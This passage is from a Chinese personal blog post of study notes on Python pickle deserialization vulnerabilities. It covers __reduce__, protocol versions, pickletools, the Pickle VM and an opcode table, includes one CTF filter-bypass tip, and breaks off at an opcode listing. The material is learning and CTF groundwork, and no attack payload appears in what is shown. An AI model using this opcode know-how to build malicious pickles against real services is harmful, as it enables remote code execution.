<!DOCTYPE html><html lang="zh-CN" id="theme-light-mode"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="zIxyd"><title>python反序列化 · zIxyd's Blog</title><meta name="description" content="前言学习python反序列化漏洞；总结了一些大佬的博客；所以本文大部分内容都来自参考博客；
本文参考：pickle反序列化初探,python pickle 反序列化总结,python反序列化漏洞
pickle简介
与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是pyth"><meta name="keywords" content="Blog,博客,Hexo"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="shortcut icon" type="image/x-icon" href="/images/logo.png"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="stylesheet" href="/css/insight.css"><link rel="stylesheet" href="/css/search.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="page-top animated fadeInDown"><div class="nav"><li> <a href="/">Home</a></li><li> <a href="/archives">Archives</a></li><li> <a href="/tags">Tags</a></li><li> <a href="/about">About</a></li></div><div class="information"><div class="nav_right_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li><li><a class="fa fa-search" onclick="openWindow();"></a></li><li><a class="fa fa-sun-o" onclick="darkLightToggle();"></a></li></div><div class="avatar"></div></div></div><div class="toc-container in-page animated fadeInDown"><details class="ltr toc-toggle"><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#pickle%E7%AE%80%E4%BB%8B"><span class="toclist-text">pickle简介</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#object-reduce-%E5%87%BD%E6%95%B0"><span class="toclist-text">object.__reduce__() 函数</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#opcode%E7%AE%80%E4%BB%8B"><span class="toclist-text">opcode简介</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#opcode%E7%89%88%E6%9C%AC"><span class="toclist-text">opcode版本</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pickletools"><span class="toclist-text">pickletools</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#PVM"><span class="toclist-text">PVM</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84opcode"><span class="toclist-text">常用的opcode</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%89%80%E6%9C%89opcode"><span class="toclist-text">所有opcode</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#opcode%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toclist-text">opcode源码分析</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toclist-text">利用思路</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toclist-text">命令执行</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#reduce"><span class="toclist-text">__reduce__</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#opcode"><span class="toclist-text">opcode</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toclist-text">变量覆盖</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#reduce-1"><span class="toclist-text">__reduce__</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#opcode-1"><span class="toclist-text">opcode</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toclist-text">实例化对象</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#pickle-Unpickler-find-class"><span class="toclist-text">pickle.Unpickler.find_class()</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#CTF%E5%AE%9E%E6%88%98"><span class="toclist-text">CTF实战</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#Code-Breaking-picklecode"><span class="toclist-text">Code-Breaking:picklecode</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-webtmp"><span class="toclist-text">高校战疫网络安全分享赛:webtmp</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#MTCTF-2022-easypickle"><span class="toclist-text">[MTCTF 2022]easypickle</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#pker%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toclist-text">pker使用说明</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E7%AE%80%E4%BB%8B"><span class="toclist-text">简介</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toclist-text">使用方法与示例</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#pker%EF%BC%9A%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toclist-text">pker：全局变量覆盖</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#pker%EF%BC%9A%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toclist-text">pker：函数执行</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#pker%EF%BC%9A%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toclist-text">pker：实例化对象</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%89%8B%E5%8A%A8%E8%BE%85%E5%8A%A9"><span class="toclist-text">手动辅助</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#pker%EF%BC%9ACTF%E5%AE%9E%E6%88%98"><span class="toclist-text">pker：CTF实战</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Code-Breaking-picklecode-1"><span class="toclist-text">Code-Breaking: picklecode</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#BalsnCTF-pyshv1"><span class="toclist-text">BalsnCTF:pyshv1</span></a></li></ol></li></ol></div></details></div><div class="sidebar animated fadeInDown"><div class="sidebar-top"><div class="logo-title"><div class="title"><img src="/images/logo.png" style="width:220px;" alt="favicon"><h3 title=""><a href="/">zIxyd's Blog</a></h3><div class="description"><p>存放个人学习笔记的小窝，欢迎交流</p></div></div><ul class="social-links"><li><a target="_blank" rel="noopener" href="https://github.com/zIxyd"><i class="fa fa-github"></i></a></li><li><a href="mailto:2972914692@qq.comm"><i class="fa fa-envelope"></i></a></li><li><a target="_blank" rel="noopener" href="https://res.abeim.cn/api-qq?qq=2972914692"><i class="fa fa-qq"></i></a></li></ul></div><div class="toc-container in-sidebar"><details class="ltr" open><summary>Menu</summary><div class="tocmenu"><ol class="toclist"><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%89%8D%E8%A8%80"><span class="toclist-text">前言</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#pickle%E7%AE%80%E4%BB%8B"><span class="toclist-text">pickle简介</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#object-reduce-%E5%87%BD%E6%95%B0"><span class="toclist-text">object.__reduce__() 函数</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#opcode%E7%AE%80%E4%BB%8B"><span class="toclist-text">opcode简介</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#opcode%E7%89%88%E6%9C%AC"><span class="toclist-text">opcode版本</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#pickletools"><span class="toclist-text">pickletools</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#PVM"><span class="toclist-text">PVM</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%B8%B8%E7%94%A8%E7%9A%84opcode"><span class="toclist-text">常用的opcode</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E6%89%80%E6%9C%89opcode"><span class="toclist-text">所有opcode</span></a></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#opcode%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toclist-text">opcode源码分析</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toclist-text">利用思路</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toclist-text">命令执行</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#reduce"><span class="toclist-text">__reduce__</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#opcode"><span class="toclist-text">opcode</span></a></li></ol></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toclist-text">变量覆盖</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#reduce-1"><span class="toclist-text">__reduce__</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#opcode-1"><span class="toclist-text">opcode</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toclist-text">实例化对象</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#pickle-Unpickler-find-class"><span class="toclist-text">pickle.Unpickler.find_class()</span></a></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#CTF%E5%AE%9E%E6%88%98"><span class="toclist-text">CTF实战</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#Code-Breaking-picklecode"><span class="toclist-text">Code-Breaking:picklecode</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-webtmp"><span class="toclist-text">高校战疫网络安全分享赛:webtmp</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#MTCTF-2022-easypickle"><span class="toclist-text">[MTCTF 2022]easypickle</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#pker%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E"><span class="toclist-text">pker使用说明</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E7%AE%80%E4%BB%8B"><span class="toclist-text">简介</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E4%B8%8E%E7%A4%BA%E4%BE%8B"><span class="toclist-text">使用方法与示例</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#pker%EF%BC%9A%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toclist-text">pker：全局变量覆盖</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#pker%EF%BC%9A%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C"><span class="toclist-text">pker：函数执行</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#pker%EF%BC%9A%E5%AE%9E%E4%BE%8B%E5%8C%96%E5%AF%B9%E8%B1%A1"><span class="toclist-text">pker：实例化对象</span></a></li><li class="toclist-item toclist-level-4"><a class="toclist-link" href="#%E6%89%8B%E5%8A%A8%E8%BE%85%E5%8A%A9"><span class="toclist-text">手动辅助</span></a></li></ol></li></ol></li><li class="toclist-item toclist-level-2"><a class="toclist-link" href="#pker%EF%BC%9ACTF%E5%AE%9E%E6%88%98"><span class="toclist-text">pker：CTF实战</span></a><ol class="toclist-child"><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#Code-Breaking-picklecode-1"><span class="toclist-text">Code-Breaking: picklecode</span></a></li><li class="toclist-item toclist-level-3"><a class="toclist-link" href="#BalsnCTF-pyshv1"><span class="toclist-text">BalsnCTF:pyshv1</span></a></li></ol></li></ol></div></details></div></div><div class="footer"><div class="p"> <span> 全站CC-BY-SA-3.0 </span><i class="fa fa-star"></i><span> zIxyd</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/Lhcfl/hexo-theme-anatolo" target="_blank">Anatolo </a></div><div class="beian"></div></div></div><div class="main"><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>python反序列化</a></h3></div><div class="post-content"><p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学习python反序列化漏洞；<code>总结</code>了一些大佬的博客；所以本文大部分内容都来自参考博客；</p>
<p>本文参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0G0=it0Q6qGNnmj7eex7uSxD5+Kx&alichlgref=https://xz.aliyun.com/t/7436#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%9D%E6%8E%A2">pickle反序列化初探</a>,<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11807?time__1311=mqmx0DBD90qWqGNqeeqBKqIDAOkaCF4D&alichlgref=https://www.google.com.hk/">python pickle 反序列化总结</a>,<a target="_blank" rel="noopener" href="https://tttang.com/archive/1885/#toc_b-__setstate__">python反序列化漏洞</a></p>
<h2 id="pickle简介"><a href="#pickle简介" class="headerlink" title="pickle简介"></a>pickle简介</h2><ul>
<li>与PHP类似，python也有序列化功能以长期储存内存中的数据。pickle是python下的序列化与反序列化包。</li>
<li>python有另一个更原始的序列化包marshal，现在开发时一般使用pickle。</li>
<li>与json相比，pickle以二进制储存，不易人工阅读；json可以跨语言，而pickle是Python专用的；pickle能表示python几乎所有的类型（包括自定义类型），json只能表示一部分内置类型且不能表示？自定义类型。</li>
<li>pickle实际上可以看作一种<strong>独立的语言</strong>，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到（pickle解析能力大于pickle生成能力）。</li>
</ul>
<h2 id="object-reduce-函数"><a href="#object-reduce-函数" class="headerlink" title="object.__reduce__() 函数"></a><code>object.__reduce__()</code> 函数</h2><ul>
<li>在开发时，可以通过重写类的 <code>object.__reduce__()</code> 函数，使之在被实例化时按照重写的方式进行。具体而言，python要求 <code>object.__reduce__()</code> 返回一个 <code>(callable, ([para1,para2...])[,...])</code> 的元组，每当该类的对象被unpickle时，该callable就会被调用以生成对象（该callable其实是构造函数）。</li>
<li>在下文pickle的opcode中， <code>R</code> 的作用与 <code>object.__reduce__()</code> 关系密切：选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。其实 <code>R</code> 正好对应 <code>object.__reduce__()</code> 函数， <code>object.__reduce__()</code> 的返回值会作为 <code>R</code> 的作用对象，当包含该函数的对象被pickle序列化时，得到的字符串是包含了 <code>R</code> 的。</li>
</ul>
<h2 id="opcode简介"><a href="#opcode简介" class="headerlink" title="opcode简介"></a>opcode简介</h2><h3 id="opcode版本"><a href="#opcode版本" class="headerlink" title="opcode版本"></a>opcode版本</h3><p>pickle由于有不同的实现版本，在py3和py2中得到的opcode不相同。但是pickle可以向下兼容（所以用v0就可以在所有版本中执行）。目前，pickle有6种版本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">a=&#123;<span class="string">&#x27;1&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">2</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;# 原变量：<span class="subst">&#123;a!r&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;pickle版本<span class="subst">&#123;i&#125;</span>&#x27;</span>,pickle.dumps(a,protocol=i))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 原变量：&#123;&#x27;1&#x27;: 1, &#x27;2&#x27;: 2&#125;</span></span><br><span class="line"><span class="comment"># pickle版本0 b&#x27;(dp0\nV1\np1\nI1\nsV2\np2\nI2\ns.&#x27;</span></span><br><span class="line"><span class="comment"># pickle版本1 b&#x27;&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line"><span class="comment"># pickle版本2 b&#x27;\x80\x02&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line"><span class="comment"># pickle版本3 b&#x27;\x80\x03&#125;q\x00(X\x01\x00\x00\x001q\x01K\x01X\x01\x00\x00\x002q\x02K\x02u.&#x27;</span></span><br><span class="line"><span class="comment"># pickle版本4 b&#x27;\x80\x04\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#x27;</span></span><br><span class="line"><span class="comment"># pickle版本5 b&#x27;\x80\x05\x95\x11\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x011\x94K\x01\x8c\x012\x94K\x02u.&#x27;</span></span><br></pre></td></tr></table></figure>

<p>这里有个小技巧，如果题目过滤了<code>\n</code>;在pickle版本4以上没有<code>\n</code></p>
<h3 id="pickletools"><a href="#pickletools" class="headerlink" title="pickletools"></a>pickletools</h3><p>使用pickletools可以方便的将opcode转化为便于肉眼读取的形式。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">test</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.people = <span class="string">&#x27;lituer&#x27;</span></span><br><span class="line">a = test()</span><br><span class="line">serialized = pickle.dumps(a, protocol=<span class="number">3</span>)  <span class="comment"># 指定PVM 协议版本</span></span><br><span class="line"><span class="built_in">print</span>(serialized)</span><br><span class="line">unserialized = pickle.loads(serialized)  <span class="comment"># 注意，loads 能够自动识别反序列化的版本</span></span><br><span class="line"><span class="built_in">print</span>(unserialized.people)</span><br><span class="line">pickletools.dis(serialized)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;\x80\x03c__main__\ntest\nq\x00)\x81q\x01&#125;q\x02X\x06\x00\x00\x00peopleq\x03X\x06\x00\x00\x00lituerq\x04sb.&#x27;</span></span><br><span class="line"><span class="comment"># lituer</span></span><br><span class="line"><span class="comment">#     0: \x80 PROTO      3</span></span><br><span class="line"><span class="comment">#     2: c    GLOBAL     &#x27;__main__ test&#x27;</span></span><br><span class="line"><span class="comment">#    17: q    BINPUT     0</span></span><br><span class="line"><span class="comment">#    19: )    EMPTY_TUPLE</span></span><br><span class="line"><span class="comment">#    20: \x81 NEWOBJ</span></span><br><span class="line"><span class="comment">#    21: q    BINPUT     1</span></span><br><span class="line"><span class="comment">#    23: &#125;    EMPTY_DICT</span></span><br><span class="line"><span class="comment">#    24: q    BINPUT     2</span></span><br><span class="line"><span class="comment">#    26: X    BINUNICODE &#x27;people&#x27;</span></span><br><span class="line"><span class="comment">#    37: q    BINPUT     3</span></span><br><span class="line"><span class="comment">#    39: X    BINUNICODE &#x27;lituer&#x27;</span></span><br><span class="line"><span class="comment">#    50: q    BINPUT     4</span></span><br><span class="line"><span class="comment">#    52: s    SETITEM</span></span><br><span class="line"><span class="comment">#    53: b    BUILD</span></span><br><span class="line"><span class="comment">#    54: .    STOP</span></span><br><span class="line"><span class="comment"># highest protocol among opcodes = 2</span></span><br></pre></td></tr></table></figure>

<p>可读性较强;想要弄懂这个回显的具体内容，我们还要弄得一个东西，PVM</p>
<h3 id="PVM"><a href="#PVM" class="headerlink" title="PVM"></a>PVM</h3><p>我们在使用pickler的时候，我们要序列化的内容，必须经过PVM，Pickle Virtual Machine (PVM)是Python语言中的一个虚拟机，用于序列化和反序列化Python对象。它是Python标准库中的一部分，由Python的pickle模块提供支持。下面是Pickle Virtual Machine的运行原理：</p>
<ol>
<li>生成操作码序列：pickle模块在序列化Python对象时，会生成一系列操作码（opcode）来表示对象的类型和值。这些操作码将被保存到文件或网络流中，以便在反序列化时使用。</li>
<li>反序列化操作码：在反序列化时，pickle模块读取操作码序列，并将其解释为Python对象。它通过Pickle Virtual Machine来执行操作码序列。Virtual Machine会按顺序读取操作码，并根据操作码的类型执行相应的操作。</li>
<li>执行操作码：Pickle Virtual Machine支持多种操作码，包括压入常量、调用函数、设置属性等。执行操作码的过程中，Virtual Machine会维护一个栈来存储数据。当执行操作码时，它会将数据从栈中取出，并根据操作码的类型进行相应的操作。执行完成后，结果将被压入栈中。</li>
<li>构造Python对象：当操作码序列被完全执行后，Pickle Virtual Machine会将栈顶的数据作为结果返回。这个结果就是反序列化后的Python对象。</li>
</ol>
<h3 id="常用的opcode"><a href="#常用的opcode" class="headerlink" title="常用的opcode"></a>常用的opcode</h3><table>
<thead>
<tr>
<th>指令</th>
<th>描述</th>
<th>具体写法</th>
<th>栈上的变化</th>
</tr>
</thead>
<tbody><tr>
<td>c</td>
<td>获取一个全局对象或import一个模块</td>
<td>c[module]\n[instance]\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>o</td>
<td>寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象）</td>
<td>o</td>
<td>这个过程中涉及到的数据都出栈，函数的返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>i</td>
<td>相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）</td>
<td>i[module]\n[callable]\n</td>
<td>这个过程中涉及到的数据都出栈，函数返回值（或生成的对象）入栈</td>
</tr>
<tr>
<td>N</td>
<td>实例化一个None</td>
<td>N</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>S</td>
<td>实例化一个字符串对象</td>
<td>S’xxx’\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>V</td>
<td>实例化一个UNICODE字符串对象</td>
<td>Vxxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>I</td>
<td>实例化一个int对象</td>
<td>Ixxx\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>F</td>
<td>实例化一个float对象</td>
<td>Fx.x\n</td>
<td>获得的对象入栈</td>
</tr>
<tr>
<td>R</td>
<td>选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数</td>
<td>R</td>
<td>函数和参数出栈，函数的返回值入栈</td>
</tr>
<tr>
<td>.</td>
<td>程序结束，栈顶的一个元素作为pickle.loads()的返回值</td>
<td>.</td>
<td>无</td>
</tr>
<tr>
<td>(</td>
<td>向栈中压入一个MARK标记</td>
<td>(</td>
<td>MARK标记入栈</td>
</tr>
<tr>
<td>t</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为元组</td>
<td>t</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>)</td>
<td>向栈中直接压入一个空元组</td>
<td>)</td>
<td>空元组入栈</td>
</tr>
<tr>
<td>l</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为列表</td>
<td>l</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>]</td>
<td>向栈中直接压入一个空列表</td>
<td>]</td>
<td>空列表入栈</td>
</tr>
<tr>
<td>d</td>
<td>寻找栈中的上一个MARK，并组合之间的数据为字典（数据必须有偶数个，即呈key-value对）</td>
<td>d</td>
<td>MARK标记以及被组合的数据出栈，获得的对象入栈</td>
</tr>
<tr>
<td>}</td>
<td>向栈中直接压入一个空字典</td>
<td>}</td>
<td>空字典入栈</td>
</tr>
<tr>
<td>p</td>
<td>将栈顶对象储存至memo_n</td>
<td>pn\n</td>
<td>无</td>
</tr>
<tr>
<td>g</td>
<td>将memo_n的对象压栈</td>
<td>gn\n</td>
<td>对象被压栈</td>
</tr>
<tr>
<td>0</td>
<td>丢弃栈顶对象</td>
<td>0</td>
<td>栈顶对象被丢弃</td>
</tr>
<tr>
<td>b</td>
<td>使用栈中的第一个元素（储存多个属性名: 属性值的字典）对第二个元素（对象实例）进行属性设置</td>
<td>b</td>
<td>栈上第一个元素出栈</td>
</tr>
<tr>
<td>s</td>
<td>将栈的第一个和第二个对象作为key-value对，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为key）中</td>
<td>s</td>
<td>第一、二个元素出栈，第三个元素（列表或字典）添加新值或被更新</td>
</tr>
<tr>
<td>u</td>
<td>寻找栈中的上一个MARK，组合之间的数据（数据必须有偶数个，即呈key-value对）并全部添加或更新到该MARK之前的一个元素（必须为字典）中</td>
<td>u</td>
<td>MARK标记以及被组合的数据出栈，字典被更新</td>
</tr>
<tr>
<td>a</td>
<td>将栈的第一个元素append到第二个元素(列表)中</td>
<td>a</td>
<td>栈顶元素出栈，第二个元素（列表）被更新</td>
</tr>
<tr>
<td>e</td>
<td>寻找栈中的上一个MARK，组合之间的数据并extends到该MARK之前的一个元素（必须为列表）中</td>
<td>e</td>
<td>MARK标记以及被组合的数据出栈，列表被更新</td>
</tr>
</tbody></table>
<h3 id="所有opcode"><a href="#所有opcode" class="headerlink" title="所有opcode"></a>所有opcode</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span 